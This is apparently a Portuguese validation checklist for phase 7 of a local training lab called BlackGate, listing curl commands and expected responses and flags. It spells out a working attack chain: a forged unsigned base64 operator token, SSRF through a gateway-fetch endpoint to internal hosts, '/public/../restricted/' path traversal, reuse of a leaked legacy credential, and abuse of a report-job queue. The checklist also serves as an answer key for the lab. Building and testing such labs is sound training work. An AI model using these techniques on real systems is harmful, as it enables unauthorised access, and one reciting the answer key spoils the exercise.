# Validacao - Lab 05 BlackGate - Fase 7

## Escopo

```text
http://localhost:8096
```

## Subir o lab

```bash
cd lab-05-blackgate
docker compose up --build
```

Em outro terminal:

```bash
docker compose ps
```

Resultado esperado:

- servico `blackgate` em execucao;
- porta `8096:3000`.

## Health e recon publico

```bash
curl -i http://localhost:8096/health
curl -i http://localhost:8096/api/version
curl -i http://localhost:8096/api/client-config
curl -i http://localhost:8096/api/routes
curl -i -H "X-Debug-Token: guest-debug" http://localhost:8096/debug/ping
```

Resultado esperado:

- `/health` retorna `1.6.0-phase7`;
- `/api/version` retorna build `bg-phase7-report-workflow`;
- client-config nao contem flag, credencial ou endpoint interno de reports;
- `/api/routes` nao lista rotas internas de reports;
- debug nao entrega endpoint final nem combinacao.

## Login e token operator

```bash
rm -f /tmp/bg-cookie.txt

curl -i -c /tmp/bg-cookie.txt \
  -d "username=guest&password=guest123" \
  -X POST http://localhost:8096/login

TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
echo "$TOKEN"
```

## Fase 3 ainda funcional

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  http://localhost:8096/api/operator/briefing
```

Resultado esperado:

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
```

## Fase 4 ainda funcional

```bash
CORE_META=$(node -e 'console.log(encodeURIComponent("http://api-core.internal/metadata"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CORE_META"
```

Resultado esperado:

```text
FLAG{blackgate_gateway_trust_ssrf_phase4}
```

## Fase 5 ainda funcional

```bash
PHASE5_FILE=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/phase5-seed.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$PHASE5_FILE"
```

Resultado esperado:

```text
FLAG{blackgate_files_vault_controlled_read_phase5}
```

## Ler arquivos novos do Files Vault

```bash
REPORT_NOTES=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/report-workflow-notes.txt"))')
QUEUE_REVIEW=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/queue-review.txt"))')
TEMPLATE_ARCHIVE=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/template-archive.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$REPORT_NOTES"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$QUEUE_REVIEW"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$TEMPLATE_ARCHIVE"
```

Resultado esperado:

- leitura funciona via bypass controlado `/public/../restricted/...`;
- nenhuma resposta contem a flag da Fase 7.

## Path direto deve falhar

```bash
DIRECT_REPORT_NOTES=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/restricted/report-workflow-notes.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$DIRECT_REPORT_NOTES"
```

Resultado esperado:

- HTTP 403;
- `forbidden_path`.

## Legacy auth e Fase 6

```bash
LEGACY_AUTH=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/auth?user=svc_migration&pass=migrate-yellow-gate"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_AUTH"
```

Resultado esperado:

```text
bg6-legacy-session-migration
```

```bash
LEGACY_MAINT=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/maintenance?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_MAINT"
```

Resultado esperado:

```text
FLAG{blackgate_legacy_credential_reuse_phase6}
```

Tambem deve conter:

```text
Maintenance reports queue jobs for asynchronous processing.
```

## Reports sem sessao deve falhar

```bash
REPORTS_NO_SESSION=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$REPORTS_NO_SESSION"
```

Resultado esperado:

- HTTP 401;
- `legacy_session_required`.

## Reports com sessao

```bash
REPORTS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$REPORTS"
```

Resultado esperado:

- `module: reports`;
- `status: partial`;
- `available_actions` contem `templates`, `preview` e `create`;
- sem flag.

## Templates

```bash
TEMPLATES=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/templates?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$TEMPLATES"
```

Resultado esperado:

- lista `daily-summary`, `asset-inventory`, `migration-check`;
- nao lista `worker-diagnostics`.

```bash
TEMPLATES_ARCHIVED=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/templates?session=bg6-legacy-session-migration&include=archived"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$TEMPLATES_ARCHIVED"
```

Resultado esperado:

- inclui `security-audit`;
- inclui referencia parcial a `worker-diagnostics`;
- sem flag.

```bash
TEMPLATES_ALL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/templates?session=bg6-legacy-session-migration&include=all&audit=1"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$TEMPLATES_ALL"
```

Resultado esperado:

- inclui `worker-diagnostics`;
- sem flag.

## Preview

```bash
PREVIEW_OK=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/preview?session=bg6-legacy-session-migration&template=migration-check&format=json&scope=summary"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$PREVIEW_OK"
```

Resultado esperado:

- HTTP 200;
- `rendered: true`;
- sem flag.

```bash
PREVIEW_WORKER=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/preview?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=summary"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$PREVIEW_WORKER"
```

Resultado esperado:

- HTTP 202;
- `Template requires queue validation before rendering.`;
- sem flag.

## Jobs decoy

Template comum:

```bash
CREATE_NORMAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=migration-check&format=json&scope=summary&queue=migration-report-queue&mode=dry-run"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_NORMAL"
```

Resultado esperado:

- HTTP 202;
- `created: true`;
- sem flag.

Template desabilitado:

```bash
CREATE_DISABLED=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=security-audit&format=json&scope=summary&queue=migration-report-queue&mode=dry-run"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_DISABLED"
```

Resultado esperado:

- HTTP 403;
- `template_disabled`.

Worker diagnostics com scope summary:

```bash
CREATE_SUMMARY=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=summary&queue=maintenance-worker&mode=queue-only"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_SUMMARY"
```

Resultado esperado:

- HTTP 202;
- `preview-only`;
- sem flag.

Worker diagnostics com queue errada:

```bash
CREATE_WRONG_QUEUE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=internal&queue=migration-report-queue&mode=queue-only"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_WRONG_QUEUE"
```

Resultado esperado:

- HTTP 202;
- job aceito na fila errada;
- sem flag.

Worker diagnostics com render sincrono:

```bash
CREATE_RENDER=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=internal&queue=maintenance-worker&mode=render"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_RENDER"
```

Resultado esperado:

- HTTP 403;
- `synchronous_render_disabled`.

Worker diagnostics com HTML:

```bash
CREATE_HTML=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=html&scope=internal&queue=maintenance-worker&mode=queue-only"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_HTML"
```

Resultado esperado:

- HTTP 415;
- `unsupported_format`.

## Criar job correto da Fase 7

```bash
CREATE_JOB=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=internal&queue=maintenance-worker&mode=queue-only"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_JOB"
```

Resultado esperado:

```text
FLAG{blackgate_report_workflow_abuse_phase7}
```

Tambem deve retornar:

- `job_id: bg7-job-worker-diagnostics`;
- `queue: maintenance-worker`;
- `status: queued`;
- `risk: unsafe-template-accepted`.

## Jobs, queue e worker status

```bash
JOBS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/jobs?session=bg6-legacy-session-migration"))')
JOB_DETAIL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/jobs/bg7-job-worker-diagnostics?session=bg6-legacy-session-migration"))')
QUEUE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/queue?session=bg6-legacy-session-migration"))')
WORKER_STATUS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/worker-status?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$JOBS"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$JOB_DETAIL"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$QUEUE"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_STATUS"
```

Resultado esperado:

- job correto aparece como `queued`;
- worker aparece como `paused`;
- bloqueios incluem `synchronous execution`, `external callbacks` e `shell execution`;
- detalhes do job nao executam comando e nao retornam output.

## Rotas autenticadas no navegador

Apos login, validar:

```text
/dashboard
/context
/gateway
/legacy
/files-vault
/tickets
/assets
/security-policy
/logout
```

## Checks estaticos

```bash
grep -R "809[0-5]" -n . --exclude-dir=node_modules --exclude-dir=.git || true
grep -R "FLAG{blackgate_report_workflow_abuse_phase7}" -n README.md STUDENT-GUIDE.md src/public src/views src/routes/api.js src/routes/debug.js src/routes/operator.js || true
grep -R "worker-diagnostics.*maintenance-worker.*queue-only" -n README.md STUDENT-GUIDE.md src/public src/views src/routes/api.js src/routes/debug.js src/routes/operator.js || true
grep -R "/reports/create" -n README.md STUDENT-GUIDE.md src/public src/views src/routes/api.js src/routes/debug.js src/routes/operator.js || true
```

Resultado esperado:

- nenhuma ocorrencia de porta antiga;
- flag da Fase 7 nao aparece em README, Student Guide, JS publico, views ou rotas publicas;
- combinacao final nao aparece em README, Student Guide, JS publico, views ou rotas publicas;
- endpoint sensivel de reports nao aparece nas superficies publicas.
